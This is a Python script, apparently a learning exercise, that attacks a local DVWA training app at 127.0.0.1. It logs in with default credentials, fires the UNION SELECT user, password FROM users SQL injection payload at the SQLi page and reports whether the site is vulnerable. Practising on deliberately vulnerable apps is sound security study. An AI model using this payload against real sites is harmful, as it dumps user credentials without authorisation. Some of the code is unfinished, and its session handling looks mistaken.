# import sys, os
import requests
from bs4 import BeautifulSoup as bs
import helper_url_encode as UrlEncodeHelper

SEPERATOR = ("_"*80)

BASE_URL = "http://127.0.0.1:80/DVWA"

payload = {
    'username': 'admin',
    'password': 'password',
    'Login':'Login'
}

def get_user_token() -> str:
    with requests.Session() as c:
        res = c.get(f"{BASE_URL}/login.php")
        soup = bs(res.text, "html.parser")
        cookies = soup.find_all("input", {"type": "hidden"})
        user_token = cookies[0]["value"]

        return user_token

def get_sqli_response(form, sqli_payload, cookies_json) -> str:
    with requests.Session() as session:
    
        if form["method"] == "GET":
            print("Form Method is GET!") #TODO: debug - remove later

            encoded_url_payload = UrlEncodeHelper.run_encode(sqli_payload)
            res = session.get(f"{BASE_URL}/vulnerabilities/sqli/?id={encoded_url_payload}&Submit=Submit#", cookies=cookies_json)
        elif form["method"] == "POST":
            print("Form Method is POST!") #TODO: debug - remove later
            
            # ! do something else with the post type of request method. for now i dont see any post methods on the DVWA wesite for SQLi attacks!
            # res = session.post(f"{BASE_URL}/vulnerabilities/sqli", sqli_payload, cookies=cookies_json)

    return res

def get_forms(html_page) -> list:
    soup = bs(html_page, "html.parser")
    forms = soup.find_all("form")

    return list(forms)

def get_pre_tags(html_page) -> list:
    soup = bs(html_page, "html.parser")
    pre_tags = soup.find_all("pre")

    return list(pre_tags)

def does_sqli_succeed(pre_tags):
    if len(pre_tags) > 1:
        return True
    return False


def main():
    user_token = get_user_token()
    
    cookies_json = {
        "PHPSESSID": user_token,
        "security": "low"
    }

    with requests.Session() as session:
        # res = session.get(f"{BASE_URL}/index.php", cookies={"PHPSESSID": user_token, "Security":"low"}) # doesn't work
        index_page_response = session.get(f"{BASE_URL}/index.php", cookies=cookies_json)
        print(index_page_response.text)

        print(SEPERATOR)
    
        sqli_page = session.get(f"{BASE_URL}/vulnerabilities/sqli/", cookies=cookies_json)
        print(sqli_page.text)

        # ! get forms
        ls_forms = get_forms(sqli_page.text)
        print(ls_forms)

        print(SEPERATOR)


        sqli_payload = "' UNION SELECT user, password FROM users#" # will return vulnerable
        # sqli_payload = "1" # wont return vulnerable

        sqli_res = get_sqli_response(ls_forms[0], sqli_payload, cookies_json)
        print(sqli_res.text)
    
        print(SEPERATOR)

        pre_tags = get_pre_tags(sqli_res.text)
        # print(pre_tags)
        print("pre_tags".upper())
        [print(item) for item in pre_tags]
        print(len(pre_tags))

        print(SEPERATOR)


        if does_sqli_succeed(pre_tags):
            print("Your website is vulnerable to SQL Injection attack!")
        else:
            print("Your website is NOT vulnerable to SQL Injection attack.")

        
#check  -> https://stackoverflow.com/questions/51381302/python-request-logging-in-to-dvwa
    

if __name__ == "__main__":
    main()
